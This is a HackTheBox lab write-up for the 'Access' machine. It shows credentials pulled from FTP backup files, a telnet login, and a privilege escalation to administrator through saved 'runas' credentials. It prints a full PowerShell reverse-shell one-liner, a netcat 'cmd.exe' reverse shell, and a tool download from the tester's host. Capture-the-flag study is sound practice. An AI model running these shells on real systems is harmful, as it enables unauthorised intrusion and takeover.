# Access | HackTheBox

### 1. Scan
```
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.46.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 13:18 UTC
Nmap scan report for 10.129.46.21
Host is up (0.22s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   216.20 ms 10.10.14.1
2   216.44 ms 10.129.46.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 379.25 seconds
```
The machine is running FTP, possibly telnet, and IIS 7.5.

### 2. Check out FTP
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~]
└──╼ [★]$ ftp 10.129.46.21
Connected to 10.129.46.21.
220 Microsoft FTP Service
Name (10.129.46.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> type binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 12.51 secs (441.3447 kB/s)
ftp> cd ../Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
10870 bytes received in 0.65 secs (16.3465 kB/s)
ftp> exit
221 Goodbye.
```
Two files were pulled from the ftp: "Access Control.zip" and backup.mdb.

### 3. Look at the files
Checking out the files, the zip file is encrypted with a password.
Looking at the mdb file, it appears to be a Microsoft Access database.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access]
└──╼ [★]$ file backup.mdb 
backup.mdb: Microsoft Access Database
```
Using msbtools utilities, the mdb file can be read on Linux. View the auth_user table.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access]
└──╼ [★]$ mdb-export backup.mdb auth_user
warning: row_size = 0.
warning: row_size = 0.
warning: row_size = 0.
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
warning: row_size = 0.
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```
This provides two possible sets of credentials: `engineer:access4u@security`, and `backup_admin:admin`.  
Most of the other tables are empty or contain data that does not appear useful.  
Use the engineer password to extract the zip:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access]
└──╼ [★]$ 7z x Access\ Control.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Xeon(R) CPU E5-2650 v4 @ 2.20GHz (406F1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access]
└──╼ [★]$ ls
'Access Control.pst'  'Access Control.zip'   backup.mdb   README.md
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access]
└──╼ [★]$ file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```
To open the pst file, I have to use readpst from pst-utils.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access/mailbox]
└──╼ [★]$ readpst Access\ Control.pst -S
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access/mailbox]
└──╼ [★]$ ls
'Access Control'  'Access Control.pst'
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access/mailbox]
└──╼ [★]$ cd Access\ Control/
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access/mailbox/Access Control]
└──╼ [★]$ ls
2
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access/mailbox/Access Control]
└──╼ [★]$ cat 2
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-422964035_-_-"


----boundary-LibPST-iamunique-422964035_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-422964035_-_-"

--alt---boundary-LibPST-iamunique-422964035_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-422964035_-_-
Content-Type: text/html; charset="us-ascii"
```
Another set of credentials have been found: `security:4Cc3ssC0ntr0ller`.

### 4. Check out the website
The web server's homepage contains a single image of some servers together with some text "LON-MC6" and not much else. Dirbusting doesn't bring up anything.  
Nikto output:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~/writeups/HackTheBox/HTB_Access]
└──╼ [★]$ nikto --url http://10.129.46.21
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.46.21
+ Target Hostname:    10.129.46.21
+ Target Port:        80
+ Start Time:         2020-12-31 15:12:09 (GMT0)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-12-31 15:41:27 (GMT0) (1758 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Nothing much to go on. For now, move on.
### 5. Check out Telnet and get a shell
There is a Telnet server that can be logged in to using the credentials in the email.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-zivnl0e54b]─[~]
└──╼ [★]$ telnet 10.129.46.21 23
Trying 10.129.46.21...
Connected to 10.129.46.21.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```
From this telnet shell, then spawn a powershell reverse shell.
```shell
C:\Users\security\Desktop>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.30',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Get the connection.
```shell
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/psh]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.84.178] 49159

PS C:\Users\security\Desktop>
```

### 6. Enumerate from user
System info:
```shell
PS C:\Users\security\Documents> systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          1/17/2021, 10:59:32 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,506 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,529 MB
Virtual Memory: In Use:    566 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 110 Hotfix(s) Installed.
```
The machine is Server 2008, but it seems reasonably well-patched.  
Check user privileges:
```shell
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/psh]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.84.178] 49159

PS C:\Users\security\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\security\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                        Attributes                                        
====================================== ================ ========================================== ==================================================
Everyone                               Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
ACCESS\TelnetClients                   Alias            S-1-5-21-953262931-566350628-63446256-1000 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                    Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                Mandatory group, Enabled by default, Enabled group
```
To upload WinPEAS I need to use a Powershell 2.0 method.
```shell
PS C:\Users\security\Documents> ─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/psh]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.84.178] 49160

PS C:\Windows\Temp> $client = New-Object System.Net.WebClient
PS C:\Windows\Temp> $client


Encoding              : System.Text.SBCSCodePageEncoding
BaseAddress           : 
Credentials           : 
UseDefaultCredentials : False
Headers               : {}
QueryString           : {}
ResponseHeaders       : 
Proxy                 : System.Net.WebRequest+WebProxyWrapper
CachePolicy           : 
IsBusy                : False
Site                  : 
Container             : 

PS C:\Windows\Temp> $url = 'http://10.10.14.30:8000/winPEAS.exe'
PS C:\Windows\Temp> $path = '.\winPEAS.exe'
PS C:\Windows\Temp> $client.DownloadFile($url, $path)
```
It doesn't work, however, as group policy seems to prevent this account from running exe files.  
List stored creds:
```shell
PS C:\> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```
The administrator password is being stored for use. This means I can run commands as the administrator user. This would be how the user can run exes.
From: https://www.windows-commandline.com/windows-runas-command-prompt/   

*Runas is a very useful command on Windows OS. This command enables one to run a command in the context of another user account. One example scenario where this could be useful is: Suppose you have both a normal user account and an administrator account on a computer and currently you are logged in as normal user account. Now you want to install some software on the computer, but as you do not have admin privileges you can’t install the same from the current account. One option is to switch user and login as administrator. Instead, you can do the same by simply using runas command. You just need to launch the installer from command prompt using runas command and by providing administrator login id and password.*
  
### 7. Get an administrator shell
Upload nc64.exe to the machine using an SMB server:
```shell
C:\Users\security\Documents>copy \\10.10.14.30\jack\nc64.exe .
        1 file(s) copied.

C:\Users\security\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Documents

01/17/2021  12:43 PM    <DIR>          .
01/17/2021  12:43 PM    <DIR>          ..
01/17/2021  12:09 PM            27,136 nc.exe
01/17/2021  12:39 PM            45,272 nc64.exe
               2 File(s)         72,408 bytes
               2 Dir(s)  16,772,706,304 bytes free
```
Then run the binary using `runas`.
```
C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "nc64.exe -e cmd.exe 10.10.14.30 9998"
```
Catch the shell in my netcat listener.
```bash
─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/smb]
└──╼ [★]$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.84.186] 49160
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator
```
